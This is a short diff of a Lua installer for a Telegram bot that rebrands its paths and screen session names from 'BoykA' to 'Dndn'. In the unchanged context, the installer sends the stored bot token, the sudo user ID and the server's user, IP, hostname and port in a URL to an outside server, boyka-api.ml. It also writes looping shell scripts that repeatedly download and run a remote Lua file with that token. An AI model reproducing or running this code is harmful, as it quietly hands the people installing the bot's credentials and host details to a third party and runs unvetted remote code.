@@ -84,27 +84,27 @@ end
 local function Files_Info_Get()
 Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"),database:get(Server_Done.."User_Write")) 
 http.request("https://boyka-api.ml/index.php?n=BOYKA-DeV&id="..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time)
-local RunBot = io.open("BoykA", 'w')
+local RunBot = io.open("Dndn", 'w')
 RunBot:write([[
 #!/usr/bin/env bash
-cd $HOME/BoykA
+cd $HOME/Dndn
 token="]]..database:get(Server_Done.."Token_Write")..[["
-rm -fr BoykA.lua
+rm -fr Dndn.lua
 wget "https://raw.githubusercontent.com/BOYKA-DeV/BoykA/main/BoykA.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./BoykA.lua -p PROFILE --bot=$token
+./tg -s ./Dndn.lua -p PROFILE --bot=$token
 done
 ]])
 RunBot:close()
 local RunTs = io.open("Run", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/BoykA
+cd $HOME/Dndn
 while(true) do
 rm -fr ../.telegram-cli
-screen -S BoykA -X kill
-screen -S BoykA ./BoykA
+screen -S Dndn -X kill
+screen -S Dndn ./Dndn
 done
 ]])
 RunTs:close()
